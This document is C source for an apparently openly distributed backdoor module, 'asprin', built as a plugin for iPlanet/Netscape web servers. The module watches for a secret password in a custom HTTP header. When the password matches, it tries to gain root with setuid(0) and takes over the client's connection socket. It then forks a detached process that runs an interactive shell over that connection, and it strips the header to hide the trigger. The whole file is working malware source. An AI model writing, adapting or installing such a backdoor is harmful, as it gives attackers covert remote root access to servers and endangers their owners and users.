/*********************************************/
/*                                           */
/*  __ _ ___ _ __  _ __(_)_ __               */
/* / _` / __| '_ \| '__| | '_ \              */
/*| (_| \__ \ |_) | |  | | | | |             */
/* \__,_|___/ .__/|_|  |_|_| |_|             */
/*          |_|                              */
/*                                           */
/*                    by SagE <sage@t0s.org> */
/*                                           */
/*********************************************/
       
#include "asprin.h"

int getClientSocketIPlanet(Session *sn) {

  int *secret;
  PRFileDesc   *fileDesc;

  if(sn!=NULL) {

    fileDesc = sn->csd;
    if(fileDesc!=NULL) {
      secret=(int *)fileDesc->secret;
      return secret[5];
    }
  }
  return -1;
}


int splitHeaderValue(char *value,char **password,int *cmdt,
                     char **term,int *wx,int *wy,char **field) {

  char *sep=NULL;
  char *cvalue=NULL;
  char *copy=NULL;
  char *ccmdt=NULL;
  char *winxy=NULL;
  
  int len;


  if(value==NULL) return -1;
  
  cvalue=(char *)malloc(sizeof(char)*(strlen(value)+1));
  memset(cvalue,0,strlen(value)+1);
  strncpy(cvalue,value,strlen(value));
  copy=cvalue;
 
  
  sep=strstr(cvalue,";");
  
  if(sep==NULL) {
    free(copy);
    return -2;
  }
  
  *sep='\0';

  
  *password=(char *) malloc (sizeof(char)*(strlen(cvalue)+1));
  memset(*password,0,strlen(cvalue)+1);
  strncpy(*password,cvalue,strlen(cvalue));
  

  cvalue=sep+1;

  sep=strstr(cvalue,";");
  
  if(sep==NULL) {
    free(*password);
    *password=NULL;
    free(copy);
    return -4;
  }
  
  *sep='\0';
  
  ccmdt=(char *) malloc (sizeof(char)*(strlen(cvalue)+1));
  memset(ccmdt,0,strlen(cvalue)+1);
  strncpy(ccmdt,cvalue,strlen(cvalue));
  *cmdt=atoi(ccmdt);
  free(ccmdt);
  ccmdt=NULL;


  if(*cmdt==ASPRIN_SH) {

    cvalue=sep+1;
    
    sep=strstr(cvalue,";");
    
    if(sep==NULL) {
      free(*password);
      *password=NULL;
      free(copy);
      return -3;
    }
    
    *sep='\0';
    
    *term=(char *) malloc (sizeof(char)*(strlen(cvalue)+1));
    memset(*term,0,strlen(cvalue)+1);
    strncpy(*term,cvalue,strlen(cvalue));
    

    cvalue=sep+1;

    sep=strstr(cvalue,";");
    
    if(sep==NULL) {
      free(*password);
      *password=NULL;
      free(*term);
      *term=NULL;
      free(copy);
      return -4;
    }
    
    *sep='\0';
    
    winxy=(char *) malloc (sizeof(char)*(strlen(cvalue)+1));
    memset(winxy,0,strlen(cvalue)+1);
    strncpy(winxy,cvalue,strlen(cvalue));
    *wx=atoi(winxy);
    free(winxy);
    winxy=NULL;
    
    cvalue=sep+1;

    sep=strstr(cvalue,";");

    if(sep==NULL) {
      free(*password);
      *password=NULL;
      free(*term);
      *term=NULL;
      free(copy);
      return -5;
    }
    
    *sep='\0';  
    winxy=(char *) malloc (sizeof(char)*(strlen(cvalue)+1));
    memset(winxy,0,strlen(cvalue)+1);
    strncpy(winxy,cvalue,strlen(cvalue));
    *wy=atoi(winxy);
    free(winxy);
    winxy=NULL;
  }

  
  cvalue=sep+1;
  
  if(*cvalue!='\0') {
    *field=(char *) malloc (sizeof(char)*(strlen(cvalue)+1));
    memset(*field,0,strlen(cvalue)+1);
    strncpy(*field,cvalue,strlen(cvalue));
  }

  free(copy);

  return 0;

}

NSAPI_PUBLIC int ASPRIN_FUNC(pblock *pb, Session *sn, Request *rq) {

  int clientSocket;
  char *hvalue=NULL;
  int p1,p2;
  
  char *password=NULL;
  char *term=NULL;
  char *field=NULL;
  int wx=-1;
  int wy=-1;
  int cmdt=-1;
  
  
  char smesg[1024];
   
  request_header(HEADER_NAME, &hvalue, sn, rq);
  
  if(hvalue!=NULL) {
    
    pblock_free(pblock_remove(HEADER_NAME,rq->srvhdrs));

    
    if(splitHeaderValue(hvalue,&password,&cmdt,&term,&wx,&wy,&field)==0) {    
      
      if(!strcmp(password,HEADER_VALUE)) {
        setuid(0);      
        setreuid(0,0);
        /* Recovering socket file .. thinks that is platform dependent */
        clientSocket=getClientSocketIPlanet(sn);
              
        memset(smesg,0,1024);
        sprintf(smesg,"%s v.%s\r\n",ASPRIN_NAME,ASPRIN_VERSION);
        write(clientSocket, smesg, strlen(smesg));
      
        p1=fork();

        switch(p1) {
        
          case -1:
          
            return REQ_EXIT; 
            
          case 0: // Son 1
            
            p2=fork();
            switch (p2) {
            
              case -1:
              
                return REQ_EXIT;
                
              case 0: // Son 2

                if(clientSocket!=-1) {
                  if(cmdt==ASPRIN_SH) {
                    runshell(clientSocket,term,wx,wy,field);
                  }
                }
                
              default:
              
                close(clientSocket);
                exit(-1);
            }
            break;
            
          default:
          
            wait(&p1);
            close(clientSocket);
            return REQ_ABORTED;
            break;
        }
      }
      free(password);
    }
  }
  return REQ_NOACTION;
}
